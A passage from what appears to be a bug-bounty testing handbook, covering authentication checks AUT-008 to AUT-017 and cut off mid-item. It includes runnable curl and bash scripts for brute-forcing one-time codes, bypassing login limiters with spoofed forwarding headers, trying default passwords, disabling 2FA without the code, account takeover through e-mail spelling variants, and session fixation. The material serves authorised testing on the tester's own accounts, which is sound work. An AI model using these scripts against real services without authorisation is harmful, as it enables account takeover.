| **Prior art** | #407971, #700612, #1265709, #743545 |

- **Where:** any check of a four to eight digit secret: reset code, one-time login code, 2FA challenge, e-mail
  or phone verification code, recovery PIN. Not long random tokens. A `rate-limit` exclusion does not close
  this item when the code is an authentication factor; `bruteforce-ok` is the gate, and without it the planner
  closes the item.
- **Test:** find what bounds guessing: a cap per code, a lockout per account, a cap per session or per IP, the
  code lifetime, and whether a resend resets the counter while the old code stays valid. Then show, on our own
  account and at the engagement rate, that many consecutive wrong codes are evaluated and the right one is
  still accepted.
- **How:** stage 1 costs 26 requests and decides the item. Trigger a code for our account, read it, do not use
  it. The helper assumes six digits; change `%06d` and the modulus for another length.
  ```bash
  EV='<e-mail of our own account, the victim>'; GOOD='<code from its mailbox>'
  D="$E/evidence/$H/AUT-008"; mkdir -p "$D"; W=$(awk "BEGIN{print 1/$RATE}")
  try(){ curl -sS "${HDR[@]}" -o "$D/last.body" -w '%{http_code} %{size_download}' -X POST "$T/api/login/code" \
    -H 'Content-Type: application/json' -d "{\"email\":\"$EV\",\"code\":\"$1\"}"; }
  run(){ for i in $(seq "$1" -1 1); do c=$(printf '%06d' $(( (10#$GOOD - i + 1000000) % 1000000 ))); echo "$c $(try "$c")"; sleep "$W"; done
         echo "GOOD $GOOD $(try "$GOOD")"; }
  run 25 | tee "$D/stage1.txt"        # 25 wrong codes, then the real one
  # stage 2, only if stage 1 ended in a session: request a fresh code, set GOOD, then K wrong codes and the real one.
  # K is the policy's ceiling when it names one, 2000 otherwise. A four-digit code is run whole (K=9999).
  run 2000 | tee "$D/stage2.txt"
  grep -v '^GOOD' "$D/stage2.txt" | awk '{print $2, $3}' | sort | uniq -c    # every wrong code: the same ordinary answer
  ```
- **Proof:** the log of K consecutive wrong codes, each answered as an ordinary wrong code, with the real code
  accepted at the end and a session issued for our account; the code length and measured lifetime; and the
  arithmetic: space S, lifetime L seconds, R requests per second evaluated, so each issued code falls with
  probability L·R/S and an attacker who keeps requesting codes expects S/(L·R) rounds. For a four-digit code,
  the complete blind run.
- **Not a finding when:** the real code is refused at the end: a cap exists even though wrong codes kept
  returning the same 200 (silent lockout), so always finish with the known code. The account or code locks
  after a few tries. The limiter is per IP and nothing but real address rotation defeats it (AUT-010 covers
  what the client can forge). The secret is long enough that S/(L·R) is years. The code protects nothing that
  authenticates: a newsletter confirmation or a coupon is `rate-limit` material.
- **Escalate:** where a limiter exists, AUT-010 for client-controlled keys, GQL-007 for hundreds of guesses in
  one batched GraphQL request, and the RAC chapter for parallel guesses that land before the counter updates.
  A reset code that falls this way is takeover of any account by identifier: prove it on our own account only.

### AUT-009 · Two-factor settings are disabled or replaced without the current code or password

| | |
|---|---|
| **Severity** | Medium standalone (a ridden or stolen session removes the factor for good); High with AUT-005 when the password-step session can call the endpoint |
| **Requires** | mfa, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Missing Critical Step in Authentication · CWE-304 |
| **Prior art** | #587910, #992450, #1139535, #670329 |

- **Where:** the settings requests that change the factor: disable 2FA, start enrolment again (new secret),
  regenerate or display backup codes, change the 2FA phone number, add a weaker method next to the existing
  one, forget trusted devices, and the "lost my device" recovery flow.
- **Test:** each of these should demand the current code or the password. Call them with the field missing,
  empty and wrong, read the account's 2FA state after each call, and repeat from the session left at the 2FA
  challenge (AUT-005).
- **How:** on our own account A with 2FA enabled.
  ```bash
  D="$E/evidence/$H/AUT-009"; mkdir -p "$D"; CT='Content-Type: application/json'
  st(){ curl -sS "${HDR[@]}" $A "$T/api/me" | grep -oE '"(two_factor|2fa|mfa|otp)[a-z_]*":[^,}]*' | tr '\n' ' '; echo; }
  st
  for b in '{}' '{"code":""}' '{"code":"000000"}' '{"password":""}' '{"password":"wrong-Aut009"}'; do
    curl -sS "${HDR[@]}" $A -o "$D/disable.body" -w "disable $b -> %{http_code}  " -X POST "$T/api/2fa/disable" -H "$CT" -d "$b"; st; sleep 1; done
  curl -sS "${HDR[@]}" $A -o "$D/backup.body" -w 'new backup codes %{http_code}\n' -X POST "$T/api/2fa/backup_codes" -H "$CT" -d '{}'
  curl -sS "${HDR[@]}" $A -o "$D/setup.body"  -w 'new secret %{http_code}\n'       -X POST "$T/api/2fa/setup" -H "$CT" -d '{}'
  grep -aoiE '"(secret|otpauth_url|codes|backup_codes)":' "$D/backup.body" "$D/setup.body"
  # the same call with the cookie jar from AUT-005 that holds only the password-step session
  curl -sS "${HDR[@]}" -b "$E/evidence/$H/AUT-005/jar.2fa" -w 'pre-2FA session disable %{http_code}\n' -o /dev/null -X POST "$T/api/2fa/disable" -H "$CT" -d '{}'
  ```
  Enable 2FA on the account again afterwards.
- **Proof:** the account's 2FA state before, one request without a valid code or password, and the state after
  (factor off, a new secret issued, or new backup codes returned), on our own account.
- **Not a finding when:** the response is 200 with an error in the body and the state did not change: read the
  state, not the status. The session re-authenticated minutes ago and the product has a "sudo" window: repeat
  with a session older than the window. Backup codes are displayed once, right after enrolment. Several
  programmes close "no password needed to disable 2FA" as informative because a live session is assumed
  trusted: report it with the session primitive that makes it matter.
- **Escalate:** reachable from the password-step session, it turns a known password into a full bypass of the
  factor. No CSRF protection on the disable request is a one-click removal (CSR chapter). A writable
  `two_factor_enabled` field on the profile update is the same result (API chapter, mass assignment). A
  recovery flow that only mails the account address is AUT-006.

### AUT-010 · The login attempt limiter keys on a value the client controls

| | |
|---|---|
| **Severity** | Low standalone; High with AUT-008 when it removes the only bound on a short code |
| **Requires** | account |
| **Excluded by** | rate-limit |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Improper Restriction of Authentication Attempts · CWE-307 |
| **Prior art** | #819930, #2627062, #727487, #170310 |

- **Where:** every endpoint that answers differently after N attempts (429, a lockout message, a captcha):
  login, the 2FA check, the reset-code check, the reset request. Our own account only.
- **Test:** reach the limit, then change one input per request and see whether the attempt is evaluated again.
  Candidates: a forwarded-address header, a different spelling of the identifier that the lookup normalises
  but the limiter does not, a different spelling of the path, a dropped session cookie, another content type.
  A blocked answer and an evaluated wrong-password answer differ, and that difference is the oracle.
- **How:**
  ```bash
  EA='<A e-mail>'; PA='<A password>'; D="$E/evidence/$H/AUT-010"; mkdir -p "$D"; W=$(awk "BEGIN{print 1/$RATE}")
  att(){ u=$1; id=$2; pw=$3; shift 3; curl -sS "${HDR[@]}" -o "$D/last.body" -w '%{http_code} %{size_download}' -X POST "$u" \
    -H 'Content-Type: application/json' -d "{\"email\":\"$id\",\"password\":\"$pw\"}" "$@"; sleep "$W"; }
  L="$T/api/login"
  # 1. threshold: wrong passwords until the answer changes, 30 at most
  for i in $(seq 1 30); do echo "$i $(att "$L" "$EA" "wrong-$i")"; done | tee "$D/threshold.txt"
  echo "control $(att "$L" "$EA" wrong-ctl)"                      # must show the blocked answer
  # 2. one changed input per request, while blocked
  for h in X-Forwarded-For X-Real-IP X-Client-IP True-Client-IP CF-Connecting-IP X-Originating-IP X-Remote-IP \
           X-Remote-Addr X-Cluster-Client-IP Fastly-Client-IP; do
    echo "$h $(att "$L" "$EA" wrong-h -H "$h: 203.0.113.$((RANDOM % 250 + 1))")"; done | tee "$D/headers.txt"
  echo "forwarded $(att "$L" "$EA" wrong-f -H 'Forwarded: for=203.0.113.77')"
  echo "xff-list  $(att "$L" "$EA" wrong-l -H 'X-Forwarded-For: 203.0.113.78, 127.0.0.1')"
  echo "upper     $(att "$L" "$(printf %s "$EA" | tr a-z A-Z)" wrong-u)"
  echo "space     $(att "$L" "$EA " wrong-s)"
  echo "slash     $(att "$L/" "$EA" wrong-p)"
  echo "query     $(att "$L?x=$RANDOM" "$EA" wrong-q)"
  echo "form      $(curl -sS "${HDR[@]}" -o /dev/null -w '%{http_code} %{size_download}' -X POST "$L" --data-urlencode "email=$EA" --data-urlencode 'password=wrong-form')"
  # 3. proof run with the input that worked (here a header): 20 more evaluated attempts, then the real password
  for i in $(seq 1 20); do echo "$i $(att "$L" "$EA" "wrong-x$i" -H "X-Forwarded-For: 198.51.100.$i")"; done | tee "$D/bypass.txt"
  echo "real password $(att "$L" "$EA" "$PA" -H 'X-Forwarded-For: 198.51.100.99')" | tee -a "$D/bypass.txt"
  ```
- **Proof:** the threshold run ending in the blocked answer, the control still blocked, then 20 attempts that
  are evaluated because one named input rotates, and the real password accepted at the end. Under 100 requests,
  all against our own account.
- **Not a finding when:** the header only counts because we connected to the origin directly; through the
  public front end it is overwritten. The limit is per account and no variation gets an attempt evaluated.
  The "bypass" is rotation of real source addresses: most programmes treat that as inherent, and it needs
  infrastructure the policy may not allow. The limiter answers with a captcha that we would have to solve.
  The policy lists `rate-limit`: the planner closes this item, and only the AUT-008 consequence is reportable.
- **Escalate:** apply the working input to the code check and move to AUT-008. A server that believes
  `X-Forwarded-For` for limiting usually believes it for IP allow-lists on admin routes (BAC chapter). Locking
  another user out by exhausting their limit is `dos` material, not an escalation.

### AUT-011 · An account provisioned in our own tenant starts with a default or derivable password

| | |
|---|---|
| **Severity** | High standalone when the same built-in login or password pattern is shown on two tenants of ours; Low when it only affects accounts whose password the admin hands over |
| **Requires** | account, multi-tenant\|roles\|invite |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Use of Default Credentials · CWE-1392 |
| **Prior art** | #699030, #128114, #2128863, #1745702 |

- **Where:** accounts that exist without their owner choosing a password, inside the tenant we own: members
  created by an admin, bulk-imported users, built-in logins that appear in a new tenant (`admin`, `support`,
  `demo`, `api`, `guest`, integration users), passwords after an admin-triggered reset, kiosk or device PINs.
  Our tenant only: default passwords are never tried on a tenant, panel or user that is not ours.
- **Test:** list the users of our tenant and look for ones we did not create. Create two members and find how
  their first password comes into being: returned in the response, mailed, or never shown. If it is never
  shown, try at most 15 derivable values on our own new member. Repeat in B's tenant, when we hold one, to
  tell a per-tenant secret from a product-wide one.
- **How:**
  ```bash
  D="$E/evidence/$H/AUT-011"; mkdir -p "$D"; CT='Content-Type: application/json'
  # 1. accounts in our tenant that we did not create
  curl -sS "${HDR[@]}" $A "$T/api/org/users" | python3 -m json.tool | grep -iE '"(email|username|login|role|type|system|created_by)"' | tee "$D/users.txt"
  # 2. two members through the admin flow; keep the full responses and the welcome mails
  for n in 1 2; do curl -sS "${HDR[@]}" $A -o "$D/create$n.body" -w "create$n %{http_code}\n" -X POST "$T/api/org/users" -H "$CT" \
    -d "{\"email\":\"<our alias>+aut011-$n@<our mail domain>\",\"role\":\"member\"}"; done
  grep -a -iE 'pass|pwd|temp|initial|secret|pin' "$D"/create*.body
  # 3. derivable first passwords, against our own new member only, 15 at most, slowly
  U='<login of member 1>'
  for p in "$U" "${U%%@*}" '<tenant name>' '<tenant name>2026' '<tenant name>123' Welcome1 Welcome123 Password1 Passw0rd changeme ChangeMe123 12345678 123456 admin; do
    printf '%-18s ' "$p"; curl -sS "${HDR[@]}" -o /dev/null -w '%{http_code}\n' -X POST "$T/api/login" -H "$CT" -d "{\"email\":\"$U\",\"password\":\"$p\"}"; sleep 3; done
  ```
- **Proof:** a login to the provisioned account in our first tenant with the default value, the same value
  working for the equivalent account in our second tenant, and one read-only identity call from each session.
  State how the login name of that account is formed in other tenants; do not try it there.
- **Not a finding when:** the first password is random per user, delivered once and must be changed at first
  login. The value is one our admin typed. The built-in account is disabled until an admin activates it. The
  default is per tenant and unpredictable. A weak password policy alone is graveyard.
- **Escalate:** a built-in account with a role above ours is privilege escalation in every tenant (BAC
  chapter). An initial password that never expires on an invited user who has not logged in yet is takeover of
  pending members. A forced-change screen is client-side if the API accepts the initial password directly
  (AUT-005 shape). Vendor defaults on an in-scope product panel belong to the CVE chapter and its rules.

### AUT-012 · Two spellings of one e-mail address are treated as different at registration and equal at login or reset

| | |
|---|---|
| **Severity** | High standalone when the variant gains access to the existing account; Low when it only creates a duplicate or look-alike account |
| **Requires** | signup, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Improper Handling of Case Sensitivity · CWE-178 |
| **Prior art** | #1224008, #785833, #922559, #171337 |

- **Where:** every place an address is compared: sign-up uniqueness, login lookup, reset lookup, e-mail change,
  invitation acceptance, SSO linking. The bug is two of them disagreeing: the application compares bytes, the
  database collation folds case, accents and trailing spaces, a normaliser applies NFKC or lower-casing, the
  column truncates.
- **Test:** our own account already exists and plays the victim. Register spellings that a second component may
  fold into its address: case changes, leading and trailing whitespace, a null byte or newline, a trailing
  dot, a Unicode character that case-folds to ASCII (dotless i, Kelvin sign, long s, full-width letters), an
  overlong value that is truncated. Sign-up must answer "already registered" for each. If one is accepted,
  check whether the original spelling now logs in with the attacker's password, and where the reset mail for
  the variant goes.
- **How:**
  ```bash
  EV='<e-mail of our own account, already registered>'; P='Aut012-variant-pw!'
  D="$E/evidence/$H/AUT-012"; mkdir -p "$D"; CT='Content-Type: application/json'
  python3 - "$EV" "$P" "$D" <<'PY'
  import sys, json
  e, p, d = sys.argv[1:4]; l, m = e.rsplit('@', 1)
  fold = {'i': 'ı', 'k': 'K', 's': 'ſ', 'a': 'ａ', 'e': 'ｅ'}   # dotless i, Kelvin sign, long s, full-width
  uni = next((l.replace(c, u, 1) for c, u in fold.items() if c in l), l + '́')
  v = {'00-same': e, 'upper': l.upper() + '@' + m, 'updom': l + '@' + m.upper(), 'trail': e + ' ', 'lead': ' ' + e,
       'tab': e + '\t', 'nul': e + '\u0000', 'nl': e + '\n', 'dot': e + '.', 'unicode': uni + '@' + m, 'long': e + ' ' * 250 + 'x'}
  for k, a in v.items(): json.dump({'email': a, 'password': p}, open(f'{d}/{k}.json', 'w'))
  PY
  for f in "$D"/*.json; do n=$(basename "$f" .json); printf '%-8s ' "$n"
    curl -sS "${HDR[@]}" -o "$D/reg-$n.body" -w '%{http_code} %{size_download}\n' -X POST "$T/api/signup" -H "$CT" --data-binary "@$f"; sleep 2; done
  # after any accepted variant: does the original spelling now open with the attacker's password, and whose profile is it?
  curl -sS "${HDR[@]}" -c "$D/v.jar" -o "$D/login-v.body" -w 'original spelling + attacker password: %{http_code}\n' -X POST "$T/api/login" -H "$CT" \
    -d "{\"email\":\"$EV\",\"password\":\"$P\"}"; curl -sS "${HDR[@]}" -b "$D/v.jar" "$T/api/me" | head -c 300
  # and the reset for the accepted variant: which mailbox receives it, whose account does the link reset?
  curl -sS "${HDR[@]}" -o /dev/null -w 'reset for variant: %{http_code}\n' -X POST "$T/password/reset" -H "$CT" --data-binary "@$D/<accepted variant>.json"
  ```
  `00-same` is the control and must be refused. The Unicode and reset parts need a mailbox that receives the
  variant (a catch-all domain of ours); without one, test the register-then-login half only.
- **Proof:** the account existing first; the attacker's sign-up or reset with variant V; then a session whose
  profile call returns the existing account's user id, obtained with the attacker's password or through a mail
  only the attacker reads. The account is ours.
- **Not a finding when:** the variant becomes a separate account with its own id and data: a look-alike
  duplicate is low or informative. Case is folded the same way everywhere. Plus and dot variants that reach
  one Gmail mailbox are distinct accounts by design (trial abuse is BIZ). The variant is rejected by
  validation. The account "taken" was an unverified one we created ourselves a minute earlier.
- **Escalate:** the same disagreement in invitation acceptance or SSO e-mail matching hands over tenant access
  (OAU chapter, BAC chapter). A variant that inherits the verified flag feeds AUT-014. Display-only
  impersonation with homoglyph names is graveyard unless staff act on it.

### AUT-013 · An account pre-registered with an unverified e-mail stays in the attacker's hands after the owner signs in with SSO

| | |
|---|---|
| **Severity** | Medium standalone (the attacker acts before the victim has an account); Low on programmes that weigh that precondition heavily |
| **Requires** | signup, oauth-login, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Improper Authentication - Generic · CWE-287 |
| **Prior art** | #1018489, #1679734, #1074047, #671406 |

- **Where:** password sign-up that creates a usable or lingering account before the address is verified, next
  to "Sign in with" buttons, One Tap, or invitation acceptance. The victim is an address we control that has
  an identity at the IdP and no account on the target yet.
- **Test:** the attacker registers the victim's address with a password and keeps the session. The victim then
  arrives through SSO. The flaw is a merge: the SSO login lands in the attacker-created account and leaves the
  attacker's password, session, linked identity or pending e-mail change in place.
- **How:**
  ```bash
  V='<address of our second IdP identity, not registered on the target>'; P='Aut013-attacker-pw!'
  D="$E/evidence/$H/AUT-013"; mkdir -p "$D"; CT='Content-Type: application/json'
  # 1. attacker: password sign-up with V, keep the session, do not verify
  curl -sS "${HDR[@]}" -c "$D/att.jar" -o "$D/signup.body" -w 'signup %{http_code}\n' -X POST "$T/api/signup" -H "$CT" -d "{\"email\":\"$V\",\"password\":\"$P\"}"
  curl -sS "${HDR[@]}" -b "$D/att.jar" -o "$D/me-before.json" -w 'attacker session before: %{http_code}\n' "$T/api/me"
  # optional, still as attacker: add our own secondary e-mail or phone, or link our own IdP identity, if settings allow it unverified
  # 2. victim: scriptable browser, clean profile, "Sign in with <IdP>" as V; save the victim's /api/me as $D/me-victim.json
  # 3. attacker again
  curl -sS "${HDR[@]}" -b "$D/att.jar" -o "$D/me-after.json" -w 'attacker session after: %{http_code}\n' "$T/api/me"
  curl -sS "${HDR[@]}" -o "$D/relogin.body" -w 'attacker password after: %{http_code}\n' -X POST "$T/api/login" -H "$CT" -d "{\"email\":\"$V\",\"password\":\"$P\"}"
  grep -aoE '"(id|user_id|uuid)":"?[A-Za-z0-9-]+' "$D"/me-before.json "$D"/me-victim.json "$D"/me-after.json
  ```
- **Proof:** the same user id in the attacker's first session, in the victim's session after SSO, and in the
  attacker's old session or fresh password login afterwards, plus one item the victim created after SSO read
  from the attacker's side. Timestamps on each step.
- **Not a finding when:** SSO for an address with an unverified password account creates a separate account,
  deletes the unverified one, or keeps it and resets its password and sessions. The password account cannot
  act and is purged before verification. The product refuses SSO until the address is verified by mail. The
  finding is also a frequent duplicate: look for it in the programme's disclosed reports first.
- **Escalate:** the same pre-registration against an address with a pending invitation takes the invited seat
  (BAC chapter). An attacker-linked IdP identity or secondary address that survives the victim's password
  reset is the stronger variant: show it. The reverse direction, an IdP that asserts an unverified address
  taking over an existing account, is OAU.

### AUT-014 · An address the attacker never proved control of is marked verified on the attacker's account

| | |
|---|---|
| **Severity** | Medium standalone; High when the verified address grants access: domain auto-join, an invitation addressed to it, an identity asserted to third parties |
| **Requires** | email-out, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Improper Authentication - Generic · CWE-287 |
| **Prior art** | #1551176, #922456, #565883, #2676025 |

- **Where:** sign-up verification, e-mail change confirmation, "add a secondary e-mail", and every consumer of
  the verified state: workspace auto-join by domain, invitations matched by address, staff-only features keyed
  on the company domain, the `email_verified` claim when the asset is an identity provider.
- **Test:** make address Y verified on account A without opening Y's mailbox. (a) The token is not bound to the
  address: get a token for X, switch the pending address to Y, confirm with X's token. (b) The confirm request
  takes the address from the client. (c) The verified flag is writable through the profile update. (d) An
  e-mail change keeps the old verified flag. (e) An unverified account is refused by the web UI and accepted
  by another route.
- **How:** X is an address we read; Y is a second address of ours whose mailbox stays closed during the test.
  ```bash
  X='<address we read>'; Y='<second address of ours>'; D="$E/evidence/$H/AUT-014"; mkdir -p "$D"; CT='Content-Type: application/json'
  st(){ curl -sS "${HDR[@]}" $A "$T/api/me" | grep -oE '"(email|email_verified|verified|confirmed|confirmed_at|unconfirmed_email|pending_email)":[^,}]*' | tr '\n' ' '; echo; }
  put(){ curl -sS "${HDR[@]}" $A -o "$D/last.body" -w "%{http_code} $1 -> " -X PATCH "$T/api/me" -H "$CT" -d "$1"; st; }
  st
  put "{\"email\":\"$X\"}"; TOK='<token mailed to X>'                         # (a)
  put "{\"email\":\"$Y\"}"
  curl -sS "${HDR[@]}" $A -o /dev/null -w 'confirm with the token of X: %{http_code} -> ' "$T/verify-email?token=$TOK"; st
  curl -sS "${HDR[@]}" $A -o /dev/null -w 'address in confirm body: %{http_code} -> ' -X POST "$T/api/email/confirm" -H "$CT" \
    -d "{\"token\":\"$TOK\",\"email\":\"$Y\"}"; st                              # (b)
  for b in '{"email_verified":true}' '{"verified":true}' '{"confirmed_at":"2026-01-01T00:00:00Z"}' "{\"email\":\"$Y\",\"email_verified\":true}"; do put "$b"; done   # (c) (d)
  # (e) a fresh unverified account on routes the UI does not use
  curl -sS "${HDR[@]}" -o "$D/ropc.body" -w 'token for unverified account: %{http_code}\n' -X POST "$T/oauth/token" -d grant_type=password \
    --data-urlencode 'username=<unverified account>' --data-urlencode 'password=<its password>'
  ```
  Put A's original address back afterwards.
- **Proof:** account A showing Y as its verified address (API field or settings page) with no mail to Y opened,
  and the consequence: A joined the organisation that auto-admits Y's domain, accepted an invitation addressed
  to Y, or received a `userinfo` response asserting Y as verified. Y is ours.
- **Not a finding when:** the product has no verified state and unverified accounts are simply allowed: "no
  e-mail verification" is informative unless some feature trusts the address. Y stays in a pending field. The
  bypass verifies an address we do control. An unverified account can browse but every trusted feature still
  checks the flag.
- **Escalate:** if Y already belongs to B, see whether A's claim detaches it from B or redirects B's reset
  mail: test with our B only. A verified victim-domain address feeds domain auto-join and invitation hijack
  (BAC chapter), AUT-013, and e-mail-matched SSO on relying parties (OAU chapter). A confirmation code that is
  short or returned in a response is AUT-008 or AUT-005.

### AUT-015 · The account e-mail or password changes with a session alone, without the current password

| | |
|---|---|
| **Severity** | Low standalone; High with a session-riding primitive (CSRF, XSS, AUT-016), which it turns into permanent takeover |
| **Requires** | account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Unverified Password Change · CWE-620 |
| **Prior art** | #1089467, #292673, #45084, #3324823 |

- **Where:** change e-mail, change password, set a password on an SSO-only account, add a recovery e-mail or
  phone, change the login name; the same actions on the mobile and older API versions, which often lack the
  `current_password` field.
- **Test:** with a session of the account and nothing else, send each change without the current password,
  with it empty, and with it wrong. For the e-mail change also note who has to confirm: only the new address,
  or the old one too. Then finish as the attacker would: reset the password through the new address.
- **How:** the session stands for one the attacker rides or borrowed; N is another address of ours.
  ```bash
  S=$B    # the ridden session: B's, or $A when we hold one account (then update its saved login afterwards)
  EV='<e-mail of that account>'; N='<another address of ours>'; D="$E/evidence/$H/AUT-015"; mkdir -p "$D"; CT='Content-Type: application/json'
  st(){ curl -sS "${HDR[@]}" $S "$T/api/me" | grep -oE '"(email|pending_email|unconfirmed_email)":"[^"]*"' | tr '\n' ' '; echo; }
  st
  for b in "{\"email\":\"$N\"}" "{\"email\":\"$N\",\"current_password\":\"\"}" "{\"email\":\"$N\",\"current_password\":\"wrong-Aut015\"}"; do
    curl -sS "${HDR[@]}" $S -o "$D/email.body" -w "%{http_code} $b -> " -X PATCH "$T/api/account" -H "$CT" -d "$b"; st; sleep 1; done
  for b in '{"new_password":"Aut015-new-pw!"}' '{"new_password":"Aut015-new-pw!","old_password":""}' '{"new_password":"Aut015-new-pw!","old_password":"wrong-Aut015"}'; do
    curl -sS "${HDR[@]}" $S -o "$D/pw.body" -w "%{http_code} $b\n" -X POST "$T/api/account/password" -H "$CT" -d "$b"; sleep 1; done
  for e in "$EV" "$N"; do curl -sS "${HDR[@]}" -o /dev/null -w "login as $e with the new password: %{http_code}\n" -X POST "$T/api/login" \
    -H "$CT" -d "{\"email\":\"$e\",\"password\":\"Aut015-new-pw!\"}"; done
  # if the address moved and the password did not: reset through N, which only the attacker reads
  curl -sS "${HDR[@]}" -o /dev/null -w 'reset to N: %{http_code}\n' -X POST "$T/password/reset" -H "$CT" -d "{\"email\":\"$N\"}"
  ```
- **Proof:** starting from the session only: the address switched to N with no password asked and no approval
  from the old address, a reset mail arriving at N, a new password set, and the original address and password
  no longer logging in. Or the password replaced directly. Account and addresses are ours.
- **Not a finding when:** the change stays pending until a link sent to the old address is clicked. The session
  authenticated moments ago and the product has a re-authentication window: repeat with an older session. The
  account is SSO-only and has no password to ask for. Alone, this is often closed as informative because the
  attacker already needs a session; report it as what makes a session primitive permanent.
- **Escalate:** a change request without CSRF protection is one-click takeover (CSR chapter); stored XSS that
  sends it is the standard XSS-to-takeover chain (XSS chapter). On a 2FA account, see whether the change asks
  for the code (AUT-009). After the change, check that old sessions and old reset tokens died (AUT-017,
  AUT-004).

### AUT-016 · The session identifier set before login is still the session after login

| | |
|---|---|
| **Severity** | Low standalone; High with a way to plant the identifier in the victim's browser (script or takeover on a sibling subdomain, header injection, an identifier accepted from the URL) |
| **Requires** | cookie-auth, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Session Fixation · CWE-384 |
| **Prior art** | #2121960, #18501, #423136, #1181962 |

- **Where:** the cookie that carries the session (find it by removing cookies one at a time from an
  authenticated request), at each point where trust rises: password login, the 2FA step, the SSO callback, a
  re-authentication prompt. Also identifiers the server reads from the URL (`;jsessionid=`, `?PHPSESSID=`,
  `?sid=`).
- **Test:** take the pre-login value, log in with it, and compare. If it did not change, a second client that
  only knows the pre-login value is now logged in. Also check whether the server adopts an identifier it never
  issued.
- **How:**
  ```bash
  D="$E/evidence/$H/AUT-016"; mkdir -p "$D"; J="$D/jar"
  ck(){ sed 's/^#HttpOnly_//' "$1" | grep -v '^#' | awk 'NF>=7{print $6"="$7}' | sort; }
  curl -sS "${HDR[@]}" -c "$J" -o "$D/login.html" "$T/login"; cp "$J" "$D/pre.jar"; ck "$D/pre.jar"
  # log in with that jar as our own account: field names and any CSRF token come from $D/login.html
  curl -sS "${HDR[@]}" -b "$J" -c "$J" -o /dev/null -w 'login %{http_code}\n' -X POST "$T/login" \
    --data-urlencode 'email=<e-mail of our own account>' --data-urlencode 'password=<its password>'
  diff <(ck "$D/pre.jar") <(ck "$J") && echo 'no cookie changed at login'
  # the attacker's copy of the pre-login cookies, never used to log in:
  curl -sS "${HDR[@]}" -b "$D/pre.jar" -o "$D/me-with-pre.body" -w 'pre-login cookies now: %{http_code}\n' "$T/api/me"
  # adoption of an identifier the server never issued, and identifiers taken from the URL
  curl -sS "${HDR[@]}" -b '<session cookie name>=aut016fixed00000000000000000000' -c "$D/adopt.jar" -o /dev/null "$T/login"; ck "$D/adopt.jar"
  curl -sS "${HDR[@]}" -o /dev/null -w 'url session: %{http_code}\n' "$T/account;jsessionid=<value from pre.jar>"
  ```
- **Proof:** the pre-login value V held by the "attacker" client, our account logging in from a client that
  carries V, and the attacker's profile call with V returning that account's data. For a reportable finding add
  the delivery step that puts V into the victim's browser.
- **Not a finding when:** login issues a new value and the old one is unauthenticated. The cookie that stayed
  the same does not carry authentication (CSRF token, load-balancer affinity, analytics, a cart id). The server
  accepts an invented identifier before login but replaces it at login. With no way to plant the cookie, most
  programmes close fixation as informative; needing the victim's own device is `physical`.
- **Escalate:** delivery vectors: script or a takeover on a sibling subdomain setting a parent-domain cookie
  (XSS chapter, STO chapter), a `Set-Cookie` through header injection (CRL chapter), a URL-borne identifier in
  a link. If the value also survives the 2FA step, a pre-2FA session fixed by the attacker becomes a full one
  (AUT-005). Fixation across the SSO callback is OAU.

### AUT-017 · A session, API token or remember-me cookie keeps working after logout, password change or an explicit revocation

| | |
|---|---|
| **Severity** | Low standalone; Medium when a revocation the user or an admin explicitly asked for (sign out everywhere, remove a device, reset after compromise, disable the account) leaves the old credential valid |
| **Requires** | account |
| **Excluded by** | session-expiry |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Insufficient Session Expiration · CWE-613 |
| **Prior art** | #1547684, #417382, #4000084, #105991 |

- **Where:** every credential the account holds at once: the web session, a second concurrent session, the
  remember-me cookie, mobile and refresh tokens, API keys, OAuth grants. Against every event meant to end
  them: logout, password change, password reset, "sign out everywhere", removing one session from the session
  list, enabling 2FA, changing the e-mail, disconnecting an SSO provider, deactivating the account.
- **Test:** keep a copy of each credential, fire the event from another session, replay the copy on an endpoint
  that returns private data. Wait two minutes and replay once more before concluding, in case revocation
  propagates through a cache.
- **How:** on our own account; B when we hold two, because the password changes.
  ```bash
  EV='<e-mail of our own account under test>'; PV='<its password>'; SC='<session cookie name>'
  D="$E/evidence/$H/AUT-017"; mkdir -p "$D"; CT='Content-Type: application/json'
  li(){ curl -sS "${HDR[@]}" -c "$1" -o /dev/null -X POST "$T/api/login" -H "$CT" -d "{\"email\":\"$EV\",\"password\":\"$2\",\"remember_me\":true}"; }
  ok(){ printf '%-28s %s\n' "$2" "$(curl -sS "${HDR[@]}" -b "$1" -o /dev/null -w '%{http_code}' "$T/api/me")"; }
  li "$D/s1" "$PV"; li "$D/s2" "$PV"; cp "$D/s1" "$D/s1.copy"
  grep -v "$SC" "$D/s2" > "$D/s2.remember"                      # remember-me cookie without the session cookie
  ok "$D/s1" s1-live; ok "$D/s2" s2-live; ok "$D/s2.remember" remember-live
  curl -sS "${HDR[@]}" -b "$D/s1" -c "$D/s1" -o /dev/null -X POST "$T/api/logout"; ok "$D/s1.copy" s1-after-logout
  li "$D/s3" "$PV"
  curl -sS "${HDR[@]}" -b "$D/s3" -o /dev/null -w 'password change %{http_code}\n' -X POST "$T/api/account/password" -H "$CT" \
    -d "{\"old_password\":\"$PV\",\"new_password\":\"Aut017-new-pw!\"}"
  ok "$D/s2" s2-after-pw-change; ok "$D/s2.remember" remember-after-pw-change
  li "$D/s4" 'Aut017-new-pw!'; li "$D/s5" 'Aut017-new-pw!'
  curl -sS "${HDR[@]}" -b "$D/s4" -o /dev/null -w 'sign out everywhere %{http_code}\n' -X POST "$T/api/sessions/revoke_all"
  ok "$D/s5" s5-after-revoke-all; ok "$D/s2" s2-after-revoke-all
  curl -sS "${HDR[@]}" -H 'Authorization: Bearer <API key created before the events>' -o /dev/null -w 'api key after all events: %{http_code}\n' "$T/api/me"
  sleep 120; ok "$D/s5" s5-two-minutes-later
  ```
- **Proof:** the revoking request shown succeeding, then the old credential returning the account's private
  data, with timestamps, twice two minutes apart. Name the event precisely: the report is about that event not
  doing what it says.
- **Not a finding when:** the policy lists `session-expiry`, which most do; the planner closes the item. A
